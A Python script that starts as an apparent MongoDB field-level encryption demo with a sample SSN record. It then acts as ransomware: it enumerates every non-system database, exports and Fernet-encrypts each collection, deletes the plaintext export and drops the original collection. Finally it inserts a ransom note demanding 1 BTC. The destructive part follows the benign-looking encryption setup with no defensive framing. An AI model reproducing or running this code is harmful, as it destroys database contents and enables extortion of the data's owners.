from pymongo.encryption import AutoEncryptionOpts, ClientEncryption, Algorithm
from bson.codec_options import CodecOptions
from bson.binary import STANDARD
import os, pymongo, subprocess
from cryptography.fernet import Fernet

def export_encrypt_mongodb(db_name, collection_name, key):
    command = ["mongoexport", "--db", db_name, "--collection", collection_name, "--out", f"./output/{db_name}-{collection_name}.json"]
    subprocess.run(command, check=True)
    with open(f'output/{db_name}-{collection_name}.json', 'rb') as f: data = f.read()
    with open(f'output/{db_name}-{collection_name}.json.enc', 'wb') as f: f.write(Fernet(key).encrypt(data))
    os.remove(f'output/{db_name}-{collection_name}.json')
    client[db_name][collection_name].drop()
def decrypt_print_data(db_name, collection_name, key):
    with open(f'output/{db_name}-{collection_name}.json.enc', 'rb') as f: 
        decrypted_data = Fernet(key).decrypt(f.read()).decode('utf-8')
        print("Confirm its still decryptable with the key: ", key)
        print(f"Decrypted data from {db_name}; {collection_name}:\n{decrypted_data}\n")

local_master_key = os.urandom(96)
kms_providers = {"local": {"key": local_master_key}}
key_vault_namespace = "encryption.__pymongoTestKeyVault"
csfle_opts = AutoEncryptionOpts(kms_providers=kms_providers, key_vault_namespace=key_vault_namespace)
client = pymongo.MongoClient(auto_encryption_opts=csfle_opts)

try:
    key_vault_db, key_vault_coll = key_vault_namespace.split(".", 1)
    key_vault = client[key_vault_db][key_vault_coll]
    key_vault.drop()
    key_vault.create_index("keyAltNames", unique=True)
except (pymongo.errors.InvalidName, pymongo.errors.DuplicateKeyError) as e: print(f"Error: {e}")

try:
    client_encryption = ClientEncryption(kms_providers, key_vault_namespace, client, CodecOptions(uuid_representation=STANDARD))
except pymongo.errors.EncryptionError as e: print(f"Error creating ClientEncryption: {e}")

key_id1 = client_encryption.create_data_key("local", key_alt_names=["example1"])
encrypted_database_name, encrypted_collection_name = "test_db", "test_collection"
encrypted_fields_map = {"fields": [{"path": "ssn", "bsonType": "string", "keyId": key_id1, "queries": {"queryType": "equality"}}]}
client_encryption.create_encrypted_collection(client[encrypted_database_name], encrypted_collection_name, encrypted_fields_map, "local", local_master_key)
encrypted_collection = client[encrypted_database_name][encrypted_collection_name]
encrypted_collection.insert_one({"username": "test_user", "ssn": "123-45-6789"})
print(list(encrypted_collection.aggregate([{"$match": {"ssn": "123-45-6789"}}])))
key = Fernet.generate_key()
for db_name in [db for db in client.list_database_names() if db not in ['admin', 'local', 'config']]:
    for collection_name in client[db_name].list_collection_names():
        export_encrypt_mongodb(db_name, collection_name, key)
        decrypt_print_data(db_name, collection_name, key)
client['RANSOM_NOTE']['README'].insert_one({'note': 'Your data has been encrypted. Send 1 BTC to restore your data.'})
